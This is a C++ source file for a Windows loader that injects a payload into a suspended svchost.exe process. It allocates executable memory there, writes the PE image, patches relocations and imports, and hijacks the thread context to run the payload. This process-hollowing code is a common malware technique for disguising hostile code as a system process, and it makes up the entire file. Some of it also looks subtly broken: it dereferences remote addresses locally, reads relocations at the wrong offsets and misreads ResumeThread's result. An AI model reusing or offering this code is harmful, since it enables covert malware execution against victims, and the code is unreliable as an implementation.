#include "reflective_loader.h"
#include <iostream>
#include <string.h>

// Define a function pointer type for LoadLibraryA and GetProcAddress
typedef HMODULE(WINAPI* LLA_FUNC)(LPCSTR);
typedef FARPROC(WINAPI* GPA_FUNC)(HMODULE, LPCSTR);

// A structure to hold the addresses of LoadLibraryA and GetProcAddress
struct ApiSet {
    LLA_FUNC pLoadLibraryA;
    GPA_FUNC pGetProcAddress;
};

// A function to resolve the IAT in the target process
bool resolve_iat(HANDLE hProcess, PVOID remote_buffer, PIMAGE_NT_HEADERS nt_headers, const ApiSet& api) {
    PIMAGE_IMPORT_DESCRIPTOR import_descriptor = (PIMAGE_IMPORT_DESCRIPTOR)((PBYTE)remote_buffer + nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);
    while (import_descriptor->Name) {
        char* dll_name = (char*)((PBYTE)remote_buffer + import_descriptor->Name);
        HMODULE dll_handle = api.pLoadLibraryA(dll_name);
        if (!dll_handle) {
            return false;
        }

        PIMAGE_THUNK_DATA thunk = (PIMAGE_THUNK_DATA)((PBYTE)remote_buffer + import_descriptor->FirstThunk);
        PIMAGE_THUNK_DATA original_thunk = (PIMAGE_THUNK_DATA)((PBYTE)remote_buffer + import_descriptor->OriginalFirstThunk);
        while (original_thunk->u1.AddressOfData) {
            FARPROC func_addr;
            if (IMAGE_SNAP_BY_ORDINAL(original_thunk->u1.Ordinal)) {
                func_addr = api.pGetProcAddress(dll_handle, (LPCSTR)IMAGE_ORDINAL(original_thunk->u1.Ordinal));
            } else {
                PIMAGE_IMPORT_BY_NAME import_by_name = (PIMAGE_IMPORT_BY_NAME)((PBYTE)remote_buffer + original_thunk->u1.AddressOfData);
                func_addr = api.pGetProcAddress(dll_handle, import_by_name->Name);
            }

            if (!func_addr) {
                return false;
            }

            if (!WriteProcessMemory(hProcess, &thunk->u1.Function, &func_addr, sizeof(FARPROC), NULL)) {
                return false;
            }

            thunk++;
            original_thunk++;
        }

        import_descriptor++;
    }

    return true;
}

bool reflective_load(const std::vector<uint8_t>& payload) {
    // 1. Create a target process in a suspended state
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));

    // Get the path to svchost.exe
    char system_path[MAX_PATH];
    GetSystemDirectoryA(system_path, MAX_PATH);
    strcat(system_path, "\\svchost.exe");

    if (!CreateProcessA(
        NULL,           // No module name (use command line)
        system_path,    // Command line
        NULL,           // Process handle not inheritable
        NULL,           // Thread handle not inheritable
        FALSE,          // Set handle inheritance to FALSE
        CREATE_SUSPENDED, // Create the process in a suspended state
        NULL,           // Use parent's environment block
        NULL,           // Use parent's starting directory
        &si,            // Pointer to STARTUPINFO structure
        &pi             // Pointer to PROCESS_INFORMATION structure
    )) {
        return false;
    }

    // Parse the PE headers of the payload
    PIMAGE_DOS_HEADER dos_header = (PIMAGE_DOS_HEADER)payload.data();
    PIMAGE_NT_HEADERS nt_headers = (PIMAGE_NT_HEADERS)(payload.data() + dos_header->e_lfanew);

    // 2. Allocate memory in the target process
    PVOID remote_buffer = VirtualAllocEx(pi.hProcess, (PVOID)nt_headers->OptionalHeader.ImageBase, nt_headers->OptionalHeader.SizeOfImage, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (!remote_buffer) {
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return false;
    }

    // 3. Write the payload to the allocated memory
    if (!WriteProcessMemory(pi.hProcess, remote_buffer, payload.data(), nt_headers->OptionalHeader.SizeOfHeaders, NULL)) {
        VirtualFreeEx(pi.hProcess, remote_buffer, 0, MEM_RELEASE);
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return false;
    }

    // Write the sections to the allocated memory
    PIMAGE_SECTION_HEADER section_header = IMAGE_FIRST_SECTION(nt_headers);
    for (int i = 0; i < nt_headers->FileHeader.NumberOfSections; i++) {
        if (!WriteProcessMemory(pi.hProcess, (PBYTE)remote_buffer + section_header[i].VirtualAddress, (PBYTE)payload.data() + section_header[i].PointerToRawData, section_header[i].SizeOfRawData, NULL)) {
            VirtualFreeEx(pi.hProcess, remote_buffer, 0, MEM_RELEASE);
            TerminateProcess(pi.hProcess, 0);
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
            return false;
        }
    }

    // 4. Perform base relocation
    DWORD_PTR delta = (DWORD_PTR)remote_buffer - nt_headers->OptionalHeader.ImageBase;
    if (delta) {
        PIMAGE_BASE_RELOCATION relocation = (PIMAGE_BASE_RELOCATION)((PBYTE)payload.data() + nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
        while (relocation->VirtualAddress) {
            PWORD reloc_info = (PWORD)(relocation + 1);
            for (int i = 0, count = (relocation->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD); i < count; i++) {
                if (reloc_info[i] >> 12 == IMAGE_REL_BASED_HIGHLOW) {
                    PDWORD_PTR patch_addr = (PDWORD_PTR)((PBYTE)remote_buffer + relocation->VirtualAddress + (reloc_info[i] & 0xFFF));
                    DWORD_PTR original_addr;
                    ReadProcessMemory(pi.hProcess, patch_addr, &original_addr, sizeof(DWORD_PTR), NULL);
                    original_addr += delta;
                    WriteProcessMemory(pi.hProcess, patch_addr, &original_addr, sizeof(DWORD_PTR), NULL);
                }
            }
            relocation = (PIMAGE_BASE_RELOCATION)((PBYTE)relocation + relocation->SizeOfBlock);
        }
    }

    // 5. Resolve the IAT
    ApiSet api;
    HMODULE kernel32 = GetModuleHandleA("kernel32.dll");
    api.pLoadLibraryA = (LLA_FUNC)GetProcAddress(kernel32, "LoadLibraryA");
    api.pGetProcAddress = (GPA_FUNC)GetProcAddress(kernel32, "GetProcAddress");
    if (!resolve_iat(pi.hProcess, remote_buffer, nt_headers, api)) {
        VirtualFreeEx(pi.hProcess, remote_buffer, 0, MEM_RELEASE);
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return false;
    }

    // 6. Hijack the thread and execute the payload
    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_FULL;
    if (!GetThreadContext(pi.hThread, &ctx)) {
        VirtualFreeEx(pi.hProcess, remote_buffer, 0, MEM_RELEASE);
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return false;
    }

    ctx.Rip = (DWORD_PTR)remote_buffer + nt_headers->OptionalHeader.AddressOfEntryPoint;
    if (!SetThreadContext(pi.hThread, &ctx)) {
        VirtualFreeEx(pi.hProcess, remote_buffer, 0, MEM_RELEASE);
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return false;
    }

    if (!ResumeThread(pi.hThread)) {
        VirtualFreeEx(pi.hProcess, remote_buffer, 0, MEM_RELEASE);
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return false;
    }

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    return true;
}
